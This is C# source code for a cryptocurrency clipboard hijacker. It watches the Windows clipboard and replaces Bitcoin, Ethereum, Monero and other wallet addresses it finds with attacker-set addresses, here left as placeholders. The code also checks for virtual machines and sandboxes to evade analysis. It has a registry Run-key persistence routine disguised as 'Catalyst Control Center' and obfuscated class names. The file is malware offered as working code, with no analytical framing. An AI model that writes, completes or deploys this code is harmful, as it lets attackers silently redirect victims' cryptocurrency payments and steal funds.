using CryptoClipboard.classes;
using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace CryptoClipboard
{
    public class Program
    {
        public static void Main()
        {
            if (antis.DetectVM() || antis.DetectSandboxie()) { return; }
            new Thread(() => { Run(); }).Start();
        }

        public static void Run()
        {
            //LiteHooks.startthread();
            Application.Run(new jdpakoiajdoijefiojosda.djoasdjoifjoijdOJIOA());
        }
    }

    internal static class Addresses
    {
        public readonly static string btc = "btc";
        public readonly static string ethereum = "eth";
        public readonly static string xmr = "xmr";
        public readonly static string doge = "doge";
        public readonly static string lte = "lte";
        public readonly static string ripple = "rp";
        public readonly static string dash = "";
        public readonly static string bch = "bch";
    }

    internal static class PatternRegex
    {
        public readonly static Regex btc = new Regex(@"\b(bc(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|[13][a-km-zA-HJ-NP-Z1-9]{25,35})\b");
        public readonly static Regex ethereum = new Regex(@"\b0x[a-fA-F0-9]{40}\b");
        public readonly static Regex xmr = new Regex(@"\b^4([0-9]|[A-B])(.){93}\b");
        public readonly static Regex doge = new Regex(@"\b^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$\b");
        public readonly static Regex lte = new Regex(@"\b^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$\b");
        public readonly static Regex ripple = new Regex(@"\br[0-9a-zA-Z]{24,34}\b");
        public readonly static Regex dash = new Regex(@"\b^X[1-9A-HJ-NP-Za-km-z]{33}\b");
        public readonly static Regex bch = new Regex(@"\b(q|p)[a-z0-9]{41}\b");
    }

    internal static class NativeMethods
    {
        public const int WM_CLIPBOARDUPDATE = 0x031D;
        public static IntPtr HWND_MESSAGE = new IntPtr(-3);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
    }

    internal static class Clipboard
    {
        public static string GetText()
        {
            string ReturnValue = string.Empty;
            Thread STAThread = new Thread(
                delegate ()
                {
                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            return ReturnValue;
        }

        public static void SetText(string txt)
        {
            Thread STAThread = new Thread(
                delegate ()
                {
                    System.Windows.Forms.Clipboard.SetText(txt);
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();
        }
    }

    public static class LiteHooks
    {
        public static void startthread()
        {
            do
            {
                // we wrap this in a try catch block to avoid errors with already existing keys / values
                try
                {
                    if (!Misc.keyExists("Catalyst Control Center"))
                    {
                        RegistryKey reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        reg.SetValue("Catalyst Control Center", "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);
                    }
                }
                catch { }
                Thread.Sleep(3000);
            } while (true);
        }
    }

    public sealed class jdpakoiajdoijefiojosda
    {
        public class djoasdjoifjoijdOJIOA : Form
        {
            private static string jadsiasjdasojosfdfdd = Clipboard.GetText();
            public djoasdjoifjoijdOJIOA()
            {
                NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
                NativeMethods.AddClipboardFormatListener(Handle);
            }

            private bool RegexResult(Regex pattern)
            {
                if (pattern.Match(jadsiasjdasojosfdfdd).Success) return true;
                else
                    return false;
            }

            protected override void WndProc(ref Message m)
            {
                if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                {
                    jadsiasjdasojosfdfdd = Clipboard.GetText();

                    if (RegexResult(PatternRegex.btc) && !jadsiasjdasojosfdfdd.Contains(Addresses.btc) && Addresses.btc != "")
                    {
                        string result = PatternRegex.btc.Replace(jadsiasjdasojosfdfdd, Addresses.btc);
                        Clipboard.SetText(result);
                    }

                    if (RegexResult(PatternRegex.ethereum) && !jadsiasjdasojosfdfdd.Contains(Addresses.ethereum) && Addresses.ethereum != "")
                    {
                        string result = PatternRegex.ethereum.Replace(jadsiasjdasojosfdfdd, Addresses.ethereum);
                        Clipboard.SetText(result);
                    }

                    if (RegexResult(PatternRegex.xmr) && !jadsiasjdasojosfdfdd.Contains(Addresses.xmr) && Addresses.xmr != "")
                    {
                        string result = PatternRegex.xmr.Replace(jadsiasjdasojosfdfdd, Addresses.xmr);
                        Clipboard.SetText(result);
                    }

                    if (RegexResult(PatternRegex.doge) && !jadsiasjdasojosfdfdd.Contains(Addresses.doge) && Addresses.doge != "")
                    {
                        string result = PatternRegex.doge.Replace(jadsiasjdasojosfdfdd, Addresses.doge);
                        Clipboard.SetText(result);
                    }

                    if (RegexResult(PatternRegex.dash) && !jadsiasjdasojosfdfdd.Contains(Addresses.dash) && Addresses.dash != "")
                    {
                        string result = PatternRegex.dash.Replace(jadsiasjdasojosfdfdd, Addresses.dash);
                        Clipboard.SetText(result);
                    }

                    if (RegexResult(PatternRegex.ripple) && !jadsiasjdasojosfdfdd.Contains(Addresses.ripple) && Addresses.ripple != "")
                    {
                        string result = PatternRegex.ripple.Replace(jadsiasjdasojosfdfdd, Addresses.ripple);
                        Clipboard.SetText(result);
                    }

                    if (RegexResult(PatternRegex.lte) && !jadsiasjdasojosfdfdd.Contains(Addresses.lte) && Addresses.lte != "")
                    {
                        string result = PatternRegex.lte.Replace(jadsiasjdasojosfdfdd, Addresses.lte);
                        Clipboard.SetText(result);
                    }

                    if (RegexResult(PatternRegex.bch) && !jadsiasjdasojosfdfdd.Contains(Addresses.bch) && Addresses.bch != "")
                    {
                        string result = PatternRegex.bch.Replace(jadsiasjdasojosfdfdd, Addresses.bch);
                        Clipboard.SetText(result);
                    }
                }
                base.WndProc(ref m);
            }
        }

    }
}